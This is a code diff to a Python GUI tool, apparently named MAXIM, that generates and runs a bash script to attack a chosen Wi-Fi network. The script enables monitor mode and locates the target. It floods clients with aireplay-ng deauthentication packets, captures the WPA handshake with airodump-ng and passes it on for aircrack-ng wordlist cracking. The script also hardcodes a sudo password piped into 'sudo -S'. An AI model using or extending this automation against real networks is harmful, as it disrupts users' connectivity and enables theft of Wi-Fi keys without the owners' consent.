@@ -1061,8 +1061,10 @@ class MaximWindow(QMainWindow):
 
         self._execute_command(f"bash '{script.name}'")
 
+    _HS_SIGNAL_FILE = "/tmp/maxim_hs_done"
+
     def _capture_handshake(self, essid):
-        """Full handshake capture: everything runs in external terminal so GUI never freezes.
+        """Handshake capture: scan+capture in external terminal, cracking in internal output.
         Uses wlan1 (external) for monitor mode. wlan0 NEVER touched."""
         import tempfile
 
@@ -1072,51 +1074,48 @@ class MaximWindow(QMainWindow):
         essid_dir = f"{out_dir}/{safe_essid}"
         capture_prefix = f"{essid_dir}/{safe_essid}"
         scan_file = "/tmp/maxim_hscan"
+        signal_file = self._HS_SIGNAL_FILE
 
         self.terminal.appendPlainText(f"\n{'═'*60}")
         self.terminal.appendPlainText(f"  HANDSHAKE CAPTURE: {essid}")
         self.terminal.appendPlainText(f"  Adapter: {iface}  (wlan0 untouched)")
         self.terminal.appendPlainText(f"  Output:  {essid_dir}/")
         self.terminal.appendPlainText(f"{'═'*60}")
-        self.terminal.appendPlainText(f"  Opening terminal — everything runs there.\n")
+        self.terminal.appendPlainText(f"  Scan + capture → external terminal")
+        self.terminal.appendPlainText(f"  Cracking → this output window\n")
 
-        # Build ONE script that does everything in the external terminal
+        # Clean signal file
+        try:
+            os.remove(signal_file)
+        except FileNotFoundError:
+            pass
+
+        # ── External terminal script: monitor mode → scan → capture ──
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n\n")
-
-        # Cache sudo
         script.write("echo '5505' | sudo -S -v 2>/dev/null\n\n")
+        script.write(f"mkdir -p '{essid_dir}'\n")
+        script.write(f"rm -f '{signal_file}'\n\n")
 
-        # Create output dirs
-        script.write(f"mkdir -p '{essid_dir}'\n\n")
-
-        # Step 1: Monitor mode on wlan1
+        # Step 1: Monitor mode
         script.write("echo '══════════════════════════════════════════'\n")
         script.write(f"echo '  HANDSHAKE CAPTURE: {essid}'\n")
         script.write("echo '══════════════════════════════════════════'\n")
         script.write("echo ''\n")
-        script.write(f"echo '[1/5] Enabling monitor mode on {iface}...'\n")
+        script.write(f"echo '[1/3] Enabling monitor mode on {iface}...'\n")
         script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
         script.write(f"sudo iw dev {iface} set type monitor 2>/dev/null\n")
         script.write(f"sudo ip link set {iface} up 2>/dev/null\n\n")
-
-        # Verify and detect monitor interface name
-        script.write(f"# Check if monitor mode worked\n")
         script.write(f"MON={iface}\n")
         script.write(f"if ! iw dev {iface} info 2>/dev/null | grep -qi monitor; then\n")
         script.write(f"  echo '[*] iw failed, trying airmon-ng...'\n")
         script.write(f"  sudo airmon-ng start {iface} 2>/dev/null\n")
         script.write(f"fi\n")
-        script.write(f"# Detect wlan1 vs wlan1mon\n")
-        script.write(f"if iw dev {iface}mon info >/dev/null 2>&1; then\n")
-        script.write(f"  MON={iface}mon\n")
-        script.write(f"fi\n")
-        script.write(f"echo \"[*] Monitor interface: $MON\"\n\n")
+        script.write(f"if iw dev {iface}mon info >/dev/null 2>&1; then MON={iface}mon; fi\n")
+        script.write(f"echo \"[*] Monitor interface: $MON\"\necho ''\n\n")
 
-        # Step 2: Scan for ESSID — loop until found or timeout (5 minutes)
-        script.write(f"echo '[2/5] Scanning for {essid}... (up to 5 minutes)'\n")
-        script.write(f"echo ''\n\n")
-
+        # Step 2: Scan loop — retry until ESSID found (up to 5 min)
+        script.write(f"echo '[2/3] Scanning for {essid}... (up to 5 minutes)'\necho ''\n\n")
         script.write(f"BSSID=''\nCHANNEL=''\n")
         script.write(f"for ATTEMPT in 1 2 3 4 5 6 7 8 9 10; do\n")
         script.write(f"  rm -f {scan_file}-* 2>/dev/null\n")
@@ -1124,109 +1123,99 @@ class MaximWindow(QMainWindow):
         script.write(f"  SCAN_PID=$!\n")
         script.write(f"  sleep 30\n")
         script.write(f"  kill $SCAN_PID 2>/dev/null; wait $SCAN_PID 2>/dev/null\n\n")
-
-        # Parse CSV inside the script
         script.write(f"  if [ -f '{scan_file}-01.csv' ]; then\n")
         script.write(f"    while IFS= read -r line; do\n")
         script.write(f"      if echo \"$line\" | grep -qi '{essid}'; then\n")
         script.write(f"        B=$(echo \"$line\" | cut -d',' -f1 | tr -d ' ')\n")
         script.write(f"        C=$(echo \"$line\" | cut -d',' -f4 | tr -d ' ')\n")
         script.write(f"        if echo \"$B\" | grep -qE '^([0-9A-Fa-f]{{2}}:){{5}}[0-9A-Fa-f]{{2}}$'; then\n")
-        script.write(f"          BSSID=$B\n")
-        script.write(f"          CHANNEL=$C\n")
-        script.write(f"          break\n")
+        script.write(f"          BSSID=$B; CHANNEL=$C; break\n")
         script.write(f"        fi\n")
         script.write(f"      fi\n")
         script.write(f"    done < '{scan_file}-01.csv'\n")
         script.write(f"  fi\n\n")
-
         script.write(f"  if [ -n \"$BSSID\" ]; then\n")
         script.write(f"    echo \"[*] FOUND: BSSID=$BSSID  Channel=$CHANNEL\"\n")
         script.write(f"    break\n")
         script.write(f"  fi\n")
         script.write(f"  echo \"[*] Attempt $ATTEMPT — '{essid}' not found yet, retrying...\"\n")
         script.write(f"done\n\n")
-
         script.write(f"rm -f {scan_file}-* 2>/dev/null\n\n")
-
-        # Check if found
         script.write(f"if [ -z \"$BSSID\" ]; then\n")
-        script.write(f"  echo ''\n")
         script.write(f"  echo '[!] Could not find network: {essid}'\n")
-        script.write(f"  echo '[!] Make sure it is in range and broadcasting.'\n")
-        script.write(f"  echo ''\n  echo 'Press Enter to close'\n  read\n  exit 1\n")
-        script.write(f"fi\n\n")
+        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
+        script.write(f"  echo 'Press Enter to close'\n  read\n  exit 1\nfi\n\n")
 
         # Step 3: Capture + Deauth
-        script.write(f"echo ''\n")
-        script.write(f"echo '[3/5] Capturing handshake...'\n")
-        script.write(f"echo '[*] Wait for WPA handshake message, then press Ctrl+C'\n")
-        script.write(f"echo ''\n\n")
-
-        # Deauth in background
-        script.write(f"(\n")
-        script.write(f"  sleep 5\n")
+        script.write(f"echo ''\necho '[3/3] Capturing handshake...'\n")
+        script.write(f"echo '[*] Wait for WPA handshake message, then press Ctrl+C'\necho ''\n\n")
+        script.write(f"(\n  sleep 5\n")
         script.write(f"  for i in 1 2 3 4 5 6 7 8 9 10; do\n")
         script.write(f"    sudo aireplay-ng --deauth 10 -a $BSSID $MON 2>/dev/null\n")
-        script.write(f"    sleep 8\n")
-        script.write(f"  done\n")
-        script.write(f") &\n")
-        script.write(f"DEAUTH_PID=$!\n\n")
-
+        script.write(f"    sleep 8\n  done\n) &\nDEAUTH_PID=$!\n\n")
         script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' $MON\n\n")
         script.write(f"kill $DEAUTH_PID 2>/dev/null\n\n")
 
-        # Show files
-        script.write(f"echo ''\necho 'Capture files:'\n")
-        script.write(f"ls -la {essid_dir}/ 2>/dev/null\n\n")
-
-        # Step 4: Auto-crack
-        script.write(f"echo ''\n")
-        script.write(f"echo '══════════════════════════════════════════'\n")
-        script.write(f"echo '  [4/5] AUTO-CRACKING HANDSHAKE...'\n")
-        script.write(f"echo '══════════════════════════════════════════'\n")
-        script.write(f"echo ''\n\n")
-
+        # Find .cap file and write path to signal file for the main app
         script.write(f"CAP_FILE=$(ls -t {essid_dir}/*.cap 2>/dev/null | head -1)\n")
-        script.write(f"if [ -z \"$CAP_FILE\" ]; then\n")
+        script.write(f"if [ -n \"$CAP_FILE\" ]; then\n")
+        script.write(f"  echo \"$CAP_FILE\" > '{signal_file}'\n")
+        script.write(f"  echo ''\necho \"[OK] Handshake saved: $CAP_FILE\"\n")
+        script.write(f"  echo '[*] Cracking will start in MAXIM output window...'\n")
+        script.write(f"else\n")
+        script.write(f"  echo 'NO_CAP' > '{signal_file}'\n")
         script.write(f"  echo '[!] No .cap file — handshake may not have been captured.'\n")
-        script.write(f"  echo 'Press Enter to close'\n  read\n  exit 1\nfi\n\n")
-        script.write(f"echo \"[*] Cracking: $CAP_FILE\"\necho ''\n\n")
-
-        # Wordlists: gago first, rockyou second, then all others
-        wordlists = [
-            "/usr/share/wordlists/gago.txt",
-            "/usr/share/wordlists/rockyou.txt",
-        ]
-        for i, wl in enumerate(wordlists, 1):
-            script.write(f"if [ -f '{wl}' ]; then\n")
-            script.write(f"  echo '  [{i}] Wordlist: {os.path.basename(wl)}'\n")
-            script.write(f"  aircrack-ng -w '{wl}' \"$CAP_FILE\"\n")
-            script.write(f"  if [ $? -eq 0 ]; then\n")
-            script.write(f"    echo ''\n    echo '  KEY FOUND!'\n")
-            script.write(f"    echo 'Press Enter to close'\n    read\n    exit 0\n  fi\nfi\n\n")
-
-        # All other wordlists
-        script.write("for WL in /usr/share/wordlists/*.txt /usr/share/wordlists/*.lst; do\n")
-        script.write("  [ \"$WL\" = '/usr/share/wordlists/gago.txt' ] && continue\n")
-        script.write("  [ \"$WL\" = '/usr/share/wordlists/rockyou.txt' ] && continue\n")
-        script.write("  [ ! -f \"$WL\" ] && continue\n")
-        script.write("  echo \"  [+] Wordlist: $(basename $WL)\"\n")
-        script.write("  aircrack-ng -w \"$WL\" \"$CAP_FILE\"\n")
-        script.write("  if [ $? -eq 0 ]; then\n")
-        script.write("    echo ''\n    echo '  KEY FOUND!'\n")
-        script.write("    echo 'Press Enter to close'\n    read\n    exit 0\n  fi\n")
-        script.write("done\n\n")
-
-        # Step 5: Brute force offer
-        script.write(f"echo ''\necho '  [5/5] Wordlists exhausted — no key found.'\n")
-        script.write(f"echo 'Press Enter to close'\nread\n")
+        script.write(f"fi\n\n")
+        script.write(f"echo ''\necho 'You can close this terminal.'\n")
+        script.write(f"sleep 3\n")
 
         script.close()
         os.chmod(script.name, 0o755)
 
-        # Open in external terminal — GUI stays responsive
+        # Open external terminal — GUI stays responsive
         self.runner.run_in_terminal(f"bash '{script.name}'")
+
+        # Start polling for the signal file — when capture is done, crack in internal output
+        self._hs_essid_dir = essid_dir
+        self._hs_poll_timer = QTimer()
+        self._hs_poll_timer.timeout.connect(self._check_handshake_done)
+        self._hs_poll_timer.start(3000)  # Check every 3 seconds
+
+    def _check_handshake_done(self):
+        """Poll for handshake capture completion, then crack in internal output."""
+        signal_file = self._HS_SIGNAL_FILE
+        if not os.path.exists(signal_file):
+            return  # Still capturing
+
+        # Stop polling
+        self._hs_poll_timer.stop()
+
+        try:
+            with open(signal_file, 'r') as f:
+                content = f.read().strip()
+        except Exception:
+            return
+        finally:
+            try:
+                os.remove(signal_file)
+            except Exception:
+                pass
+
+        if content == "FAILED" or content == "NO_CAP":
+            self.terminal.appendPlainText(f"\n[!] Handshake capture failed — no .cap file to crack.\n")
+            return
+
+        cap_file = content
+        if not os.path.exists(cap_file):
+            self.terminal.appendPlainText(f"\n[!] Cap file not found: {cap_file}\n")
+            return
+
+        # Crack in internal output using _analyze_file (which does gago→rockyou→all others)
+        self.terminal.appendPlainText(f"\n{'═'*60}")
+        self.terminal.appendPlainText(f"  HANDSHAKE CAPTURED — CRACKING NOW")
+        self.terminal.appendPlainText(f"  File: {cap_file}")
+        self.terminal.appendPlainText(f"{'═'*60}\n")
+        self._analyze_file(cap_file)
 
     # ═══════════════════════════════════════
     #  COMMAND EXECUTION
